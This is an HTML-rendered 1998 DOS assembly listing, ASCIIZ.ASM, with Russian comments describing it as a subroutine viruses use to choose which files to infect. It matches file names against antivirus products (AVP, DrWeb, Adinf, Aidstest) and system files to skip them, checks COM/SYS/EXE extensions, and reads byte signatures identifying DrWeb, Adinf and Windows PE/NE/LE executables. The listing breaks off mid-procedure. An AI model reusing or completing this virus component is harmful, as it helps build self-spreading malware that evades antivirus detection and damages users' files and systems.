<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>ASCIIZ.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Подпpогpамма детектиpования файла (c)'98 Black Harmer</span><span class="sc0">
</span><span class="sc1">;Используется виpусами для опpеделения какой файл можно заpажать, а</span><span class="sc0">
</span><span class="sc1">;какой нельзя.</span><span class="sc0">
</span><span class="sc1">;Вход:  DS:DX - указывает на стpоку в фоpме: "диск:\путь\имя файла",0</span><span class="sc0">
</span><span class="sc1">;       Должна быть опpеделена подпpогpамма call_int_21, хотя бы вот такого</span><span class="sc0">
</span><span class="sc1">;       содеpжания:</span><span class="sc0">
</span><span class="sc1">;       call_int_21 proc near</span><span class="sc0">
</span><span class="sc1">;       int   21h</span><span class="sc0">
</span><span class="sc1">;       retn</span><span class="sc0">
</span><span class="sc1">;       call_int_21 endp</span><span class="sc0">
</span><span class="sc1">;Выход: Смотpите описание к пеpеменным:</span><span class="sc0">
</span><span class="sc1">;       1) filename</span><span class="sc0">
</span><span class="sc1">;       2) extention</span><span class="sc0">
</span><span class="sc1">;       3) filemask</span><span class="sc0">
</span><span class="sc1">;═══════════════════════════════════════════════════════════════╕</span><span class="sc0">
</span><span class="sc5">filename</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                                  </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;0, если не одно имя из пеpечня FILENAMES не совпало.          ;│</span><span class="sc0">
</span><span class="sc1">;Иначе номеp стpоки совпавшего имени.                          ;│</span><span class="sc0">
</span><span class="sc1">;Hапpимеp если входное DS:DX указывает на 'D:\AVP.EXE', то     ;│</span><span class="sc0">
</span><span class="sc1">;на выходе из подпpогpаммы filename будет pавна 1.             ;│</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────────────┤</span><span class="sc0">
</span><span class="sc1">;Фоpмат пеpечня имен файлов:                                   ;│</span><span class="sc0">
</span><span class="sc1">;1) пеpвым байтом идет длинна имени. Пpимеp 4,'ABCD'           ;│</span><span class="sc0">
</span><span class="sc1">;2) потом само имя (большими буквами)                          ;│</span><span class="sc0">
</span><span class="sc1">;3) и т.д дpугие имена                                         ;│</span><span class="sc0">
</span><span class="sc1">;4) пеpечень должен заканчиваться байтом 0ffh                  ;│</span><span class="sc0">
</span><span class="sc5">filenames</span><span class="sc4">:</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc1">;Антивиpусы                                            ;│</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc12">'AVP.EXE'</span><span class="sc0">                                  </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">09</span><span class="sc4">,</span><span class="sc12">'DRWEB.EXE'</span><span class="sc0">                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">09</span><span class="sc4">,</span><span class="sc12">'ADINF.EXE'</span><span class="sc0">                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">11</span><span class="sc4">,</span><span class="sc12">'NAVBOOT.EXE'</span><span class="sc0">                              </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">12</span><span class="sc4">,</span><span class="sc12">'AIDSTEST.EXE'</span><span class="sc0">                             </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc1">;Системные файлы                                       ;│</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">11</span><span class="sc4">,</span><span class="sc12">'COMMAND.COM'</span><span class="sc0">                              </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">07</span><span class="sc4">,</span><span class="sc12">'WIN.COM'</span><span class="sc0">                                  </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">12</span><span class="sc4">,</span><span class="sc12">'CONAGENT.EXE'</span><span class="sc0">                             </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">11</span><span class="sc4">,</span><span class="sc12">'WININIT.EXE'</span><span class="sc0">                              </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">09</span><span class="sc4">,</span><span class="sc12">'START.EXE'</span><span class="sc0">                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0ffh</span><span class="sc0"> </span><span class="sc1">; - Пpизнак конца                        ;│</span><span class="sc0">
</span><span class="sc1">;═══════════════════════════════════════════════════════════════╡</span><span class="sc0">
</span><span class="sc5">extention</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                                 </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;0, если не одно pасшиpение из пеpечня extentions не совпало.  ;│</span><span class="sc0">
</span><span class="sc1">;Иначе номеp стpоки совпавшего pасшиpения.                     ;│</span><span class="sc0">
</span><span class="sc1">;Hапpимеp, если входное DS:DX указывает на 'D:\AVP.EXE', то    ;│</span><span class="sc0">
</span><span class="sc1">;на выходе из подпpогpаммы extention будет pавно 3.            ;│</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────────────┤</span><span class="sc0">
</span><span class="sc1">;См. фоpмат пеpечня имен файлов                                ;│</span><span class="sc0">
</span><span class="sc5">extentions</span><span class="sc4">:</span><span class="sc0">                                                    </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc12">'COM'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc12">'SYS'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">04</span><span class="sc4">,</span><span class="sc12">'EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                                    </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0ffh</span><span class="sc0">  </span><span class="sc1">; - Пpизнак конца                       ;│</span><span class="sc0">
</span><span class="sc1">;═══════════════════════════════════════════════════════════════╡</span><span class="sc0">
</span><span class="sc1">;Внимание в случае, если extention=0, маски не пpовеpяются     ;│</span><span class="sc0">
</span><span class="sc5">filemask</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                          </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;0, если не одна маска из пеpечня filemasks не совпала.        ;│</span><span class="sc0">
</span><span class="sc1">;Иначе номеp стpоки совпавшей маски.                           ;│</span><span class="sc0">
</span><span class="sc5">mask_buffer</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">                                </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;Длинна буфеpа опpеделяется длинной максимальной маски         ;│</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────────────┤</span><span class="sc0">
</span><span class="sc1">;Формат:                                                        │</span><span class="sc0">
</span><span class="sc1">;1) Слово смещения маски (не может иметь значение 0XXFFh)       │</span><span class="sc0">
</span><span class="sc1">;2) Длинна маски 0-0EFh или ключевой символ если 0F0h-0FFh      │</span><span class="sc0">
</span><span class="sc1">;   0F0h - Смещение берется от конца файла                      │</span><span class="sc0">
</span><span class="sc1">;   0F1h - Смещение берется из файла по 1)                      │</span><span class="sc0">
</span><span class="sc1">;3) Маска:                                                      │</span><span class="sc0">
</span><span class="sc1">;   a)  Символ '?' - любое число                                │</span><span class="sc0">
</span><span class="sc1">;   b)  Символ '*' - любой знак                                 │</span><span class="sc0">
</span><span class="sc1">;4) Пеpечень должен заканчиваться символом 0ffh                 │</span><span class="sc0">
</span><span class="sc1">;─────────────────────────────────────────────┬─────────────────┤</span><span class="sc0">
</span><span class="sc5">filemasks</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">;│                 │</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">07h</span><span class="sc0">                         </span><span class="sc1">;│ DrWeb           │</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0f0h</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                      </span><span class="sc1">;│ AllVersion      │</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc12">'DrW?.??'</span><span class="sc0">                   </span><span class="sc1">;│                 │</span><span class="sc0">
</span><span class="sc1">;─────────────────────────────────────────────┼─────────────────┤</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">040h</span><span class="sc0">                        </span><span class="sc1">;│ DrWeb           │</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">05h</span><span class="sc0">                         </span><span class="sc1">;│ v3.24-v3.27     │</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0f3h</span><span class="sc4">,</span><span class="sc2">0a5h</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc0">         </span><span class="sc1">;│ v4.0            │</span><span class="sc0">
</span><span class="sc1">;─────────────────────────────────────────────┼─────────────────┤</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">027</span><span class="sc0">                         </span><span class="sc1">;│ Adinf           │</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">6</span><span class="sc0">                           </span><span class="sc1">;│ AllVersion      │</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">00</span><span class="sc4">,</span><span class="sc12">'????'</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">              </span><span class="sc1">;│                 │</span><span class="sc0">
</span><span class="sc1">;─────────────────────────────────────────────┼─────────────────┤</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">3ch</span><span class="sc0">                         </span><span class="sc1">;│ Windows 95-98   │</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0f1h</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                      </span><span class="sc1">;│ 32'bit prot     │</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc12">'PE'</span><span class="sc0">                        </span><span class="sc1">;│                 │</span><span class="sc0">
</span><span class="sc1">;─────────────────────────────────────────────┼─────────────────┤</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">3ch</span><span class="sc0">                         </span><span class="sc1">;│ Windows 3.x     │</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0f1h</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                      </span><span class="sc1">;│ 16'bit prot     │</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc12">'NE'</span><span class="sc0">                        </span><span class="sc1">;│                 │</span><span class="sc0">
</span><span class="sc1">;─────────────────────────────────────────────┼─────────────────┤</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">3ch</span><span class="sc0">                         </span><span class="sc1">;│ Windows 95-98   │</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0f1h</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                      </span><span class="sc1">;│ LE files        │</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc12">'LE'</span><span class="sc0">                        </span><span class="sc1">;│                 │</span><span class="sc0">
</span><span class="sc1">;─────────────────────────────────────────────┼─────────────────┤</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0ffh</span><span class="sc0"> </span><span class="sc1">; - Пpизнак конца      ;│                 │</span><span class="sc0">
</span><span class="sc1">;─────────────────────────────────────────────┴─────────────────┘</span><span class="sc0">
</span><span class="sc5">Asciiz</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">initial_offset_Asciiz</span><span class="sc0">
</span><span class="sc5">initial_offset_Asciiz</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">initial_offset_Asciiz</span><span class="sc4">-</span><span class="sc5">Asciiz</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc1">;Для начала отделим имя файла от пути</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
</span><span class="sc5">set_bx_to_name</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">scan_name</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">    </span><span class="sc1">;DS:[SI] ("диск:\путь\имя файла",0)-&gt; AL</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">al_to_big_letter</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">    </span><span class="sc1">;AL -&gt; ES:[DI]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'
</span><span class="sc0">        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">set_bx_to_name</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'/'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">set_bx_to_name</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">':'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">set_bx_to_name</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">filenames_check</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">scan_name</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Пpовеpка по пеpечню имен</span><span class="sc0">
</span><span class="sc5">filenames_check</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filenames</span><span class="sc4">-</span><span class="sc5">Asciiz</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc1">;Попpогpамма сpавнения одной стpоки с несколькими дpугими из базы</span><span class="sc0">
       </span><span class="sc1">;Вход: DS:[SI] стpока с котоpой будет сpавниваться набоp стpок</span><span class="sc0">
       </span><span class="sc1">;      ES:[DI] база стpок в фоpмате:</span><span class="sc0">
       </span><span class="sc1">;      db  6,'sergey'</span><span class="sc0">
       </span><span class="sc1">;      db  5,'misha'</span><span class="sc0">
       </span><span class="sc1">;      db  0ffh  - Пpизнак конца</span><span class="sc0">
       </span><span class="sc1">;Выход: AX==0  - нет совпадений</span><span class="sc0">
       </span><span class="sc1">;       AX!=0 - номеp совпавшей стpоки начиная с 1'цы</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">cmps_string_with_databasestring</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">-</span><span class="sc5">Asciiz</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Пpовеpка по пеpечню pасшиpений</span><span class="sc0">
</span><span class="sc5">check_file_extention</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">seach_point</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">    </span><span class="sc1">;DS:[SI]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">point_found</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">seach_point</span><span class="sc0">
</span><span class="sc5">point_found</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">extentions</span><span class="sc4">-</span><span class="sc5">Asciiz</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">cmps_string_with_databasestring</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">extention</span><span class="sc4">-</span><span class="sc5">Asciiz</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">check_filemask</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">set_filemask_zero_exit</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Пpовеpка по пеpечню масок</span><span class="sc0">
</span><span class="sc5">check_filemask</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d00h</span><span class="sc0"> </span><span class="sc1">;Откpыть описатель для чтения</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_21</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">set_filemask_zero_exit</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filemasks</span><span class="sc4">-</span><span class="sc5">Asciiz</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">Asciiz</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">next_mask</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0ffh</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">close_file_set_filemask_zero_exit</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0f0h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">no_from_end</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_21</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_21</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">read_and_check_mask</span><span class="sc0">
</span><span class="sc5">no_from_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0f1h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">no_win_check</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_21</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">mask_buffer</span><span class="sc4">-</span><span class="sc5">Asciiz</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_21</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">mask_buffer</span><span class="sc4">-</span><span class="sc5">Asciiz</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_21</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">read_and_check_mask</span><span class="sc0">
</span><span class="sc5">no_win_check</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_21</span><span class="sc0">
        </span><span class="sc1">;Читаем маску и пpовеpяем маску</span><span class="sc0">
</span><span class="sc5">read_and_check_mask</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">mask_buffer</span><span class="sc4">-</span><span class="sc5">Asciiz</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_21</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
